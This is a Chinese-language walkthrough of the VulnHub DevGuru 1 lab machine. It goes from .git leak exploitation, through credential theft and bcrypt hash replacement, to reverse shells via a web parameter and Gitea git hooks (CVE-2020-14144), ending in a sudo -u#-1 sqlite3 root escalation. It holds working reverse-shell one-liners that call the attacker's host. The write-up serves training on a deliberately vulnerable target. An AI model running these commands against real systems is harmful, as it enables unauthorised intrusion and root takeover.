下载地址：https://www.vulnhub.com/entry/devguru-1,620/

## 信息收集

![image-20240917125410555](./imgs/image-20240917125410555.png)

开放了22，80，8585端口

接下来详细信息扫描

![image-20240917125717298](./imgs/image-20240917125717298.png)

发现`.git`泄露

指定漏洞脚本扫描

![image-20240917130000221](./imgs/image-20240917130000221.png)



## git泄露利用



https://github.com/lijiejie/GitHack

```python
python3 GitHack.py http://172.16.31.7/.git
```

![image-20240917132113560](./imgs/image-20240917132113560.png)

在`config` 目录下发现 `database.php` 数据库文件，打开文件，发现默认密码

![image-20240917132229584](./imgs/image-20240917132229584.png)

```php
'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => 3306,
            'database'   => 'octoberdb',
            'username'   => 'october',
            'password'   => 'SQ66EBYx4GT3byXH',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],
```

查看刚才获得的源码，发现存在 `adminer` 页面，这个页面可以登录数据库

![image-20240917132845041](./imgs/image-20240917132845041.png)



在 `octoberdb` 库中的 `backend_users` 表找到登录用户名和密码，但是看不出密码的加密算法

![image-20240917133002824](./imgs/image-20240917133002824.png)

通过搜索引擎搜索上述密码的前几位 `$2y$10`，找到 https://www.cnblogs.com/DeeLMind/p/7450124.html 网页，其中提到了一个算法

![image-20240917133231949](./imgs/image-20240917133231949.png)



同时发现该 [octobercms](https://octobercms.com/) 使用 `Laravel`PHP 框架，而 `Laravel` 的加密算法使用的是 `Bcrypt 哈希算法`，与上一条提示的密码算法一致

![image-20240917133333278](./imgs/image-20240917133333278.png)

![image-20240917133511576](./imgs/image-20240917133511576.png)

在 [https://bcrypt-generator.com](https://bcrypt-generator.com/) 中输入想要加密的内容，生成密文



![image-20240917133648287](./imgs/image-20240917133648287.png)

将数据库中的密文更换成新密文

![image-20240917133726946](./imgs/image-20240917133726946.png)

使用 `frank/123456` 登录后台，成功

![image-20240917133814208](./imgs/image-20240917133814208.png)

发现存在写代码的地方，估计可以直接写代码反弹 shell

![image-20240917134523076](./imgs/image-20240917134523076.png)







![image-20240917134543695](./imgs/image-20240917134543695.png)



## 反弹shell

反弹shell，先开启监听

```
nc -lvvnp 2233
```

访问URL，实现反弹

注意reverse shell语句中的&要替换为URL编码%26

```bash
http://172.16.31.7/about?0=/bin/bash -c 'bash -i >%26 /dev/tcp/172.16.31.4/2233 0>%261'
```

成功getshell

![image-20240917135010815](./imgs/image-20240917135010815.png)



获取一个正常点的shell环境

![image-20240917135302853](./imgs/image-20240917135302853.png)







## linpeas信息收集

https://github.com/peass-ng/PEASS-ng

linpeas是一个流行的脚本,用于在渗透测试中进行特权升级和系统枚举。



Kali中开启服务

![image-20240917135617630](./imgs/image-20240917135617630.png)

靶机接收并执行

```bash
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.log
```



![image-20240917135648804](./imgs/image-20240917135648804.png)

在 /var/backups 目录下的 app.ini.bak 文件中，发现一处敏感信息

![image-20240917142901947](./imgs/image-20240917142901947.png)

![image-20240917140507737](./imgs/image-20240917140507737.png)

```bash
[database]
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
PASSWD              = UfFPTF8C8jjxVF2m
```

## **Gitea漏洞(CVE-2020-14144)利用**

 Gitea 版本为1.12.5 ，我们借助 exploit-db 查找相关漏洞

![image-20240917141640300](./imgs/image-20240917141640300.png)

```bash
searchsploit Gitea | grep 1.12.5
```



![image-20240917141802352](./imgs/image-20240917141802352.png)

这是一个 RCE 脚本，我们查看具体内容，发现只要提供目标IP、gitea后台用户名及密码、接收反弹 shell 的机器IP及监听端口，即可利用

![image-20240917144250344](./imgs/image-20240917144250344.png)

登录gitea数据库

![image-20240917143658037](./imgs/image-20240917143658037.png)





在 user 表中同样发现账户 frank, 修改后使用加密Bcrypt算法

![image-20240917143834492](./imgs/image-20240917143834492.png)

![image-20240917143917646](./imgs/image-20240917143917646.png)

![image-20240917144001656](./imgs/image-20240917144001656.png)







![image-20240917144042478](./imgs/image-20240917144042478.png)

使用利用脚本发现抱错

![image-20240917144735172](./imgs/image-20240917144735172.png)

阅读 49571.py 脚本开头给出的PoC演示文章：[Exploiting CVE-2020-14144 - GiTea Authenticated Remote Code Execution using git hooks · Podalirius](https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/)

![image-20240917144827681](./imgs/image-20240917144827681.png)

可以发现利用的原理就是在 Settings -> Git Hooks 中写入shell反弹语句

```bach
#!/bin/bash
bash -i >& /dev/tcp/172.16.31.4/2345 0>&1 &
```

![image-20240917145041207](./imgs/image-20240917145041207.png)

![image-20240917145220950](./imgs/image-20240917145220950.png)

![image-20240917145301857](./imgs/image-20240917145301857.png)

![image-20240917145344455](./imgs/image-20240917145344455.png)

继续阅读演示文章，告诉我们需要向仓库提交一次代码，然后就可以 reverse shell

![image-20240917145459710](./imgs/image-20240917145459710.png)





![image-20240917145556019](./imgs/image-20240917145556019.png)

然后直接进行提交

![image-20240917145627639](./imgs/image-20240917145627639.png)

成功 reverse shell

![image-20240917145647752](./imgs/image-20240917145647752.png)

## 提权

### sqlite3利用

查看能执行的sudo命令

```bash
sudo -l
```

发现一个sqlite3可以执行，但是权限是非root用户

同时，frank用户无法直接以root身份运行/bin/bash

![image-20240917145756863](./imgs/image-20240917145756863.png)

在 [sqlite3 | GTFOBins](https://gtfobins.github.io/gtfobins/sqlite3/) 上查阅 sqlite3 相关信息

```bash
sudo sqlite3 /dev/null '.shell /bin/sh'
```



![image-20240917150324177](./imgs/image-20240917150324177.png)

查看sudo版本

![image-20240917145942715](./imgs/image-20240917145942715.png)

sudo版本为 1.8.21p2，存在被利用的可能

在 HackTricks 上查阅相关信息：[Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-less-than-v1.28)

![image-20240917150103955](./imgs/image-20240917150103955.png)

### sudo结合sqlite3提权

```bash
sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
```

![image-20240917150545008](./imgs/image-20240917150545008.png)
